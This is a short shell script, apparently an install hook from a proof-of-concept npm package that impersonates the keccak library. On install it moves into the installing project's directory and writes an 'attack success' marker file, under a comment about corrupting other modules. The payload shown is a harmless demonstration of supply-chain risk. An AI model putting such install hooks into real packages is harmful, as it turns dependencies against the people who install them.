# grab start directory
ORIGIN_DIR=$(pwd)

# navigate to project dir
cd $INIT_CWD;

# corrupt other modules
echo "attack success!\n" > attack.txt
echo "non-canonical-keccak impersonated npm keccak and ran install hooks" >> attack.txt
echo "attack originated from '$ORIGIN_DIR'" >> attack.txt